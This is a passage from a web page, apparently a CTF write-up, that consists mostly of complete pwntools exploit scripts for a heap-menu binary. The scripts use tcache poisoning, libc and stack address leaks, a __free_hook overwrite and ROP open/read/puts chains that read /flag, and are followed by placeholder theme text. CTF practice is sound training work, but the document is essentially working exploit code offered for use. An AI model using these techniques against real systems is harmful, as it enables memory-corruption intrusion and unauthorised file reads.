class="string">&#x27;index?&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">	sa(<span class="string">&#x27;description:&#x27;</span>,data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">quit</span>():</span><br><span class="line">	sla(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak_libc</span>(<span class="params">addr</span>):</span><br><span class="line">	<span class="keyword">global</span> libc_base,mh,fh,system,binsh_addr,_IO_2_1_stdout_,realloc</span><br><span class="line">	libc_base = addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">	leak(<span class="string">&quot;libc base &quot;</span>,libc_base) </span><br><span class="line">	mh = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">	system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">	binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">	realloc = libc_base + libc.sym[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line">	fh = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">	_IO_2_1_stdout_ = libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">	<span class="comment">#leak_heap</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">		add(i,<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">		free(<span class="number">6</span>-i)</span><br><span class="line">	free(<span class="number">8</span>)</span><br><span class="line">	free(<span class="number">7</span>)</span><br><span class="line">	add(<span class="number">0</span>,<span class="number">1</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	free(<span class="number">8</span>)</span><br><span class="line">	add(<span class="number">0</span>,<span class="number">1</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	free(<span class="number">8</span>)</span><br><span class="line">	show(<span class="number">0</span>)</span><br><span class="line">	ru(<span class="string">&#x27;nder: &#x27;</span>)</span><br><span class="line">	heap_addr = uu64(r(<span class="number">6</span>))</span><br><span class="line">	leak(<span class="string">&#x27;heap_addr&#x27;</span>,heap_addr)</span><br><span class="line"></span><br><span class="line">	<span class="comment">#leak_libc</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">9</span>):</span><br><span class="line">		add(i,<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">	show(<span class="number">0</span>)<span class="comment">#0 and 8</span></span><br><span class="line">	ru(<span class="string">&#x27;nder: &#x27;</span>)</span><br><span class="line">	base = uu64(r(<span class="number">6</span>))-<span class="number">0x1ecbe0</span></span><br><span class="line">	leak(<span class="string">&#x27;libc&#x27;</span>,base)</span><br><span class="line">	open_addr  = base + libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">	read_addr = base + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">	puts = base + libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">	gadget = base + <span class="number">0x154d0a</span></span><br><span class="line">	free_hook = base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">	setcontext = base + libc.sym[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">61</span></span><br><span class="line">	p_rdi_r = base + <span class="number">0x023b72</span></span><br><span class="line">	p_rdx_r12_r = base + <span class="number">0x0119241</span></span><br><span class="line">	p_rsi_r = base + <span class="number">0x2604f</span></span><br><span class="line">	leave_r = base + <span class="number">0x0578f8</span></span><br><span class="line">	rop = heap_addr + <span class="number">0x5d0</span></span><br><span class="line">	add_rsp_0x18_r = base + <span class="number">0x034a1a</span></span><br><span class="line">	ret = base + <span class="number">0x022679</span></span><br><span class="line">	leak(<span class="string">&#x27;free_hook&#x27;</span>,free_hook)</span><br><span class="line">	leak(<span class="string">&#x27;gadget&#x27;</span>,gadget)</span><br><span class="line">	leak(<span class="string">&#x27;libc&#x27;</span>,base)</span><br><span class="line"></span><br><span class="line">	add(<span class="number">9</span>,<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">	free(<span class="number">3</span>)</span><br><span class="line">	free(<span class="number">1</span>)</span><br><span class="line">	name_edit(<span class="number">0</span>,p64(heap_addr+<span class="number">0x380</span>)[:-<span class="number">1</span>])<span class="comment">#0 and 1</span></span><br><span class="line">	add(<span class="number">8</span>,<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">	add(<span class="number">9</span>,<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment"># fake_chunk</span></span><br><span class="line">	pl = p64(<span class="number">0</span>) + p64(<span class="number">0x111</span>) + <span class="string">b&#x27;/flag\x00&#x27;</span></span><br><span class="line">	pl = pl.ljust(<span class="number">0x58</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">	pl+= p64(heap_addr + <span class="number">0x5d0</span>)</span><br><span class="line">	pl+= p64(leave_r)</span><br><span class="line">	content_edit(<span class="number">9</span>,pl)</span><br><span class="line"></span><br><span class="line">	free(<span class="number">7</span>)</span><br><span class="line">	free(<span class="number">8</span>)</span><br><span class="line">	name_edit(<span class="number">0</span>,p64(free_hook)[:-<span class="number">1</span>])</span><br><span class="line">	add(<span class="number">8</span>,<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">	add(<span class="number">7</span>,<span class="number">1</span>,p64(gadget)[:-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">	pl = p64(ret) + p64(add_rsp_0x18_r)*<span class="number">2</span><span class="comment">#stack_down</span></span><br><span class="line">	pl+= p64(heap_addr + <span class="number">0x3c8</span>) <span class="comment"># rax</span></span><br><span class="line">	pl+= <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x8</span></span><br><span class="line">	<span class="comment"># orw chains</span></span><br><span class="line">	<span class="comment"># open</span></span><br><span class="line">	pl+= p64(p_rdi_r)+p64(heap_addr+<span class="number">0x3a0</span>)+p64(p_rsi_r)+p64(<span class="number">0</span>)+p64(open_addr)</span><br><span class="line">	<span class="comment"># read</span></span><br><span class="line">	pl+= p64(p_rdi_r)+p64(<span class="number">4</span>)+p64(p_rsi_r)+p64(heap_addr+<span class="number">0xb30</span>)+p64(p_rdx_r12_r)+p64(<span class="number">0x30</span>)*<span class="number">2</span>+p64(read_addr)</span><br><span class="line">	<span class="comment"># puts</span></span><br><span class="line">	pl+= p64(p_rdi_r)+p64(heap_addr+<span class="number">0xb30</span>)+p64(puts)</span><br><span class="line">	content_edit(<span class="number">4</span>,pl)</span><br><span class="line">	gdb.attach(p,<span class="string">&#x27;b* &#x27;</span>+<span class="built_in">str</span>(gadget))</span><br><span class="line">	free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">	itr()</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">i = 0</span></span><br><span class="line"><span class="string">while 1:</span></span><br><span class="line"><span class="string">	i += 1</span></span><br><span class="line"><span class="string">	log.warn(str(i))</span></span><br><span class="line"><span class="string">	try:  </span></span><br><span class="line"><span class="string">		pwn()</span></span><br><span class="line"><span class="string">	except Exception:</span></span><br><span class="line"><span class="string">		p.close()</span></span><br><span class="line"><span class="string">		if(local == 1):</span></span><br><span class="line"><span class="string">			p = process(binary)</span></span><br><span class="line"><span class="string">		else:</span></span><br><span class="line"><span class="string">			p = remote(ip,port)</span></span><br><span class="line"><span class="string">		continue</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	pwn()</span><br></pre></td></tr></table></figure>

<h3 id="解法三"><a href="#解法三" class="headerlink" title="解法三"></a>解法三</h3><p>泄露栈地址直接劫持ret</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding = utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&quot;pwn&quot;</span></span><br><span class="line">libcelf = <span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span></span><br><span class="line"></span><br><span class="line">og = [<span class="number">0x4342</span>,<span class="number">0x3342</span>]</span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(data) </span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :p.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line">plt     = <span class="keyword">lambda</span> data               :elf.plt[data]</span><br><span class="line">got     = <span class="keyword">lambda</span> data               :elf.got[data]</span><br><span class="line">sym     = <span class="keyword">lambda</span> data               :libc.sym[data]</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr          :log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">elf = ELF(binary)</span><br><span class="line">libc = ELF(libcelf)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,sex,name</span>):</span><br><span class="line">	sla(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;index?\n&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">	sla(<span class="string">&#x27;2.Girl:\n&#x27;</span>,<span class="built_in">str</span>(sex))</span><br><span class="line">	sa(<span class="string">&quot;Please input your child&#x27;s name:\n&quot;</span>,name)</span><br><span class="line">	  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">name_edit</span>(<span class="params">idx,name</span>):</span><br><span class="line">	sla(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;index&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">	sa(<span class="string">&#x27;name:&#x27;</span>,name)</span><br><span class="line">	ru(<span class="string">&#x27;Done!\n&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">	sla(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;index?&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">	sla(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;index?&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change_sex</span>(<span class="params">idx,sex</span>):</span><br><span class="line">	sla(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;666&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;index?&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">	ru(<span class="string">b&#x27;Current gender:&#x27;</span>)</span><br><span class="line">	temp = uu64(r(<span class="number">6</span>))</span><br><span class="line">	sla(<span class="string">&#x27;2.Girl:&#x27;</span>,<span class="built_in">str</span>(sex))</span><br><span class="line">	<span class="keyword">return</span> temp</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">content_edit</span>(<span class="params">idx,data</span>):</span><br><span class="line">	sla(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;index?&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">	sa(<span class="string">&#x27;description:&#x27;</span>,data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">quit</span>():</span><br><span class="line">	sla(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak_libc</span>(<span class="params">addr</span>):</span><br><span class="line">	<span class="keyword">global</span> libc_base,mh,fh,system,binsh_addr,_IO_2_1_stdout_,realloc</span><br><span class="line">	libc_base = addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">	leak(<span class="string">&quot;libc base &quot;</span>,libc_base) </span><br><span class="line">	mh = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">	system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">	binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">	realloc = libc_base + libc.sym[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line">	fh = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">	_IO_2_1_stdout_ = libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">	<span class="comment">#leak_heap</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">		add(i,<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">		free(<span class="number">6</span>-i)</span><br><span class="line">	<span class="comment">#gdb.attach(p)</span></span><br><span class="line">	free(<span class="number">8</span>)</span><br><span class="line">	free(<span class="number">7</span>)</span><br><span class="line">	add(<span class="number">0</span>,<span class="number">1</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	free(<span class="number">8</span>)</span><br><span class="line">	add(<span class="number">0</span>,<span class="number">1</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	free(<span class="number">8</span>)</span><br><span class="line">	show(<span class="number">0</span>)</span><br><span class="line">	ru(<span class="string">&#x27;nder: &#x27;</span>)</span><br><span class="line">	heap_addr = uu64(r(<span class="number">6</span>))</span><br><span class="line">	leak(<span class="string">&#x27;heap_addr&#x27;</span>,heap_addr)</span><br><span class="line"></span><br><span class="line">	<span class="comment">#leak_libc</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">9</span>):</span><br><span class="line">		add(i,<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">	show(<span class="number">0</span>)<span class="comment">#0 and 8</span></span><br><span class="line">	ru(<span class="string">&#x27;nder: &#x27;</span>)</span><br><span class="line">	base = uu64(r(<span class="number">6</span>))-<span class="number">0x1ecbe0</span></span><br><span class="line">	leak(<span class="string">&#x27;libc&#x27;</span>,base)</span><br><span class="line">	open_addr  = base + libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">	read_addr = base + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">	puts = base + libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">	gadget = base + <span class="number">0x154d0a</span></span><br><span class="line">	free_hook = base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">	setcontext = base + libc.sym[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">61</span></span><br><span class="line">	p_rdi_r = base + <span class="number">0x023b72</span></span><br><span class="line">	p_rdx_r12_r = base + <span class="number">0x0119241</span></span><br><span class="line">	p_rsi_r = base + <span class="number">0x2604f</span></span><br><span class="line">	leave_r = base + <span class="number">0x0578f8</span></span><br><span class="line">	rop = heap_addr + <span class="number">0x5d0</span></span><br><span class="line">	add_rsp_0x18_r = base + <span class="number">0x034a1a</span></span><br><span class="line">	ret = base + <span class="number">0x022679</span></span><br><span class="line">	environ = base + libc.sym[<span class="string">&#x27;__environ&#x27;</span>]</span><br><span class="line">	leak(<span class="string">&#x27;free_hook&#x27;</span>,free_hook)</span><br><span class="line">	leak(<span class="string">&#x27;environ&#x27;</span>,environ)</span><br><span class="line">	leak(<span class="string">&#x27;gadget&#x27;</span>,gadget)</span><br><span class="line">	leak(<span class="string">&#x27;libc&#x27;</span>,base)</span><br><span class="line">	<span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">	add(<span class="number">9</span>,<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">	free(<span class="number">3</span>)</span><br><span class="line">	free(<span class="number">1</span>)</span><br><span class="line">	name_edit(<span class="number">0</span>,p64(environ-<span class="number">0x10</span>)[:-<span class="number">1</span>])</span><br><span class="line">	add(<span class="number">8</span>,<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">	add(<span class="number">9</span>,<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#environ</span></span><br><span class="line">	show(<span class="number">9</span>)</span><br><span class="line">	stack_addr = uu64(ru(<span class="string">&#x27;\x2e&#x27;</span>)[-<span class="number">6</span>:])</span><br><span class="line">	main_ret = stack_addr - <span class="number">0x100</span></span><br><span class="line">	leak(<span class="string">&#x27;stack&#x27;</span>,stack_addr)</span><br><span class="line">	leak(<span class="string">&#x27;ret&#x27;</span>,main_ret)</span><br><span class="line"></span><br><span class="line">	free(<span class="number">7</span>)</span><br><span class="line">	free(<span class="number">8</span>)</span><br><span class="line">	name_edit(<span class="number">0</span>,p64(main_ret-<span class="number">0x10</span>)[:-<span class="number">1</span>])</span><br><span class="line">	add(<span class="number">8</span>,<span class="number">1</span>,<span class="string">&#x27;/flag\x00\x00&#x27;</span>)</span><br><span class="line">	add(<span class="number">7</span>,<span class="number">1</span>,<span class="string">&#x27;aa&#x27;</span>)</span><br><span class="line">	<span class="comment">#open</span></span><br><span class="line">	pl= p64(p_rdi_r)+p64(heap_addr+<span class="number">0xb10</span>)+p64(p_rsi_r)+p64(<span class="number">0</span>)+p64(open_addr)</span><br><span class="line">	<span class="comment"># read</span></span><br><span class="line">	pl+= p64(p_rdi_r)+p64(<span class="number">4</span>)+p64(p_rsi_r)+p64(heap_addr+<span class="number">0xb30</span>)+p64(p_rdx_r12_r)+p64(<span class="number">0x30</span>)*<span class="number">2</span>+p64(read_addr)</span><br><span class="line">	<span class="comment"># puts</span></span><br><span class="line">	pl+= p64(p_rdi_r)+p64(heap_addr+<span class="number">0xb30</span>)+p64(puts)</span><br><span class="line">	content_edit(<span class="number">7</span>,pl)</span><br><span class="line">	<span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">	quit()</span><br><span class="line"></span><br><span class="line">	itr()</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">i = 0</span></span><br><span class="line"><span class="string">while 1:</span></span><br><span class="line"><span class="string">	i += 1</span></span><br><span class="line"><span class="string">	log.warn(str(i))</span></span><br><span class="line"><span class="string">	try:  </span></span><br><span class="line"><span class="string">		pwn()</span></span><br><span class="line"><span class="string">	except Exception:</span></span><br><span class="line"><span class="string">		p.close()</span></span><br><span class="line"><span class="string">		if(local == 1):</span></span><br><span class="line"><span class="string">			p = process(binary)</span></span><br><span class="line"><span class="string">		else:</span></span><br><span class="line"><span class="string">			p = remote(ip,port)</span></span><br><span class="line"><span class="string">		continue</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	pwn()</span><br></pre></td></tr></table></figure></div>
</article>

  </main>
  <aside>
    <p>This is an `aside`, a useful place to put information of any kind: metadata about the site author (with or without pictures), brief information about the purposes of the site, a static collection of external links or anything else.</p>
<p>For some Classless themes pictures and data about the author may suit better in the `cover` and `description` site attributes (see `config.toml`), but most of the times that kind of information will fit here better.</p>

  </aside>
  <footer role="contentinfo">
    <p>A default site footer. If you don't know what to place here maybe you should just write your name plus the current year?</p>
<p>If you want to have a sitemap, a contact form or other complex stuff, most Classless themes will also handle it nicely. Or you can take a look at the <code>aside.html</code> partial.</p>

  </footer>
</body>
